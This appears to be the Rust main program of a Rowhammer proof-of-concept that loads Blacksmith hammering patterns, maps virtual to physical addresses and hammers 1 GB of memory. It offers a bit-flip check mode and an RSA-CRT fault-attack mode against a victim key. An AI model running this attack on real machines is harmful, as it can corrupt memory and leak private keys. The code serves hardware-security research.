use anyhow::{bail, Context, Result};
use bs_poc::forge::{HammerVictim, Hammerer};
use bs_poc::memory::{BitFlip, LinuxPageMap, Memory, VirtToPhysResolver};
use bs_poc::util::{BlacksmithConfig, MemConfiguration};
use bs_poc::victim::HammerVictimRsa;
use clap::Parser;
use rand::rngs::StdRng;
use std::fmt::Debug;

#[macro_use]
extern crate log;

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    /// The JSON file containing the memory config
    #[clap(long = "config", default_value = "config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(long = "pattern")]
    pattern: String,
    /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
    #[clap(long = "hammer-mode")]
    hammer_mode: HammerMode,
    /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
    #[clap(long = "elevated-priority", action)]
    elevated_priority: bool,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum HammerMode {
    MemCheck,
    Rsa,
}

#[derive(Debug)]
struct HammerVictimMemCheck<'a> {
    mem_config: MemConfiguration,
    memory: &'a Memory,
    seed: Option<[u8; 32]>,
    flips: Vec<BitFlip>,
}

impl<'a> HammerVictimMemCheck<'a> {
    fn new(mem_config: MemConfiguration, memory: &'a Memory) -> Self {
        HammerVictimMemCheck {
            mem_config,
            memory,
            seed: None,
            flips: vec![],
        }
    }
}

impl<'a> HammerVictim for HammerVictimMemCheck<'a> {
    fn init(&mut self) {
        let seed = rand::random();
        self.memory.initialize::<StdRng>(seed);
        self.seed = Some(seed);
    }

    fn check(&mut self) -> bool {
        self.flips = self.memory.check::<StdRng>(
            self.mem_config,
            self.seed.with_context(|| "no seed").unwrap(),
        );
        !self.flips.is_empty()
    }

    fn log_report(&self) {
        let virt_addrs: Vec<String> = self
            .flips
            .iter()
            .map(|bf| bf.dram_addr.to_virt(self.memory.addr, self.mem_config))
            .map(|addr| format!("0x{:02X}", addr as usize))
            .collect();
        info!("Addresses with flips: {:?}", virt_addrs);
    }
}

fn main() -> Result<()> {
    env_logger::init();
    info!("startup");
    let args = CliArgs::parse();
    info!("args: {:?}", args);

    if args.elevated_priority {
        let ret = unsafe { libc::setpriority(libc::PRIO_PROCESS, 0, -20) };
        if ret < 0 {
            bail!("setpriority failed. Are we root?");
        }
    }

    const MEM_SIZE: usize = 1 << 30; // 1 GB

    let memory = Memory::new(MEM_SIZE)?;

    info!("allocated {} B of memory", MEM_SIZE);

    let mut resolver = LinuxPageMap::new()?;
    let phys = resolver.get_phys(memory.addr as u64);
    match phys {
        Ok(phys) => info!("phys base_msb: 0x{:02X}", phys),
        Err(err) => warn!("Failed to determine physical address: {}", err),
    }

    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config =
        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
    let hammerer = Hammerer::new(
        mem_config,
        args.load_json.clone(),
        args.pattern.clone(),
        memory.addr.clone(),
    )?;
    let mut victim: Box<dyn HammerVictim> = match args.hammer_mode {
        HammerMode::MemCheck => Box::new(HammerVictimMemCheck::new(mem_config, &memory)),
        HammerMode::Rsa => Box::new(HammerVictimRsa::new(&memory)?),
    };
    info!("initialized hammerer");
    info!("start hammering");
    loop {
        let result = hammerer.hammer(victim.as_mut())?;
        println!(
            "Successful at run {} after {} attempts",
            result.run, result.attempt,
        );
        victim.log_report();
    }
}
